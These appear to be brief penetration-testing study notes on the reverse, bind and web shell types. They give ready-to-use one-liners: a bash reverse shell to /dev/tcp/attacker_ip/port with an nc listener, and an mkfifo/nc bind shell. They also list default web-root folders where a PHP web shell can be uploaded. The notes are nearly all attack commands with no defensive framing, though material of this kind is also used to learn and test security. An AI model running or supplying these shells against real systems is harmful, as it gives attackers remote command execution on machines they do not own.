- There are three general types of shells: reverse shell, bind shell, and web shell.

- Reverse shell example: `nc -lnvp PORT_NUMBER` on attacker and then `bash -c ‘bash -i >& /dev/tcp/attacker_ip/port 0>&1’`

- Bind shell example: `rm /tmp/f;mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` and then connecting from the attacker side.

- Webshell upload a vulnerable .php file to the host folder (depends on the web server version).
	Apache = /var/www/html
	Nginx = /usr/local/nginx/html/
	IIS = [C:/inetpub/wwwroot/](/C:/inetpub/wwwroot/)
	XAMPP = [C:/xampp/htdocs/](/C:/xampp/htdocs/)